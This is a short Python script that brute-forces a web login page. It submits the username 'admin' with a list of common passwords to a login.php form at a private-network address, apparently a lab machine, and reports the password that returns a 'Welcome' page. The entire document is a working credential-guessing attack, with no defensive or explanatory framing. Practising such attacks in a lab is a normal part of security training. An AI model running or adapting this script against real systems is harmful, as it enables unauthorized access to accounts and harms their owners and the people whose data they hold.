import requests

target = "http://192.168.56.102/login.php"
username = "admin"
passwords = ["123456", "admin", "password", "password123", "admin123", "letmein", "farah123"]

print(f"Brute forcing: {target}")
print(f"Username: {username}")
print("-" * 40)

for password in passwords:
    data = {"username": username, "password": password}
    response = requests.post(target, data=data)
    if "Welcome" in response.text:
        print(f"[+] PASSWORD FOUND: {password}")
        break
    else:
        print(f"[-] Failed: {password}")

print("-" * 40)
print("Brute force complete!")
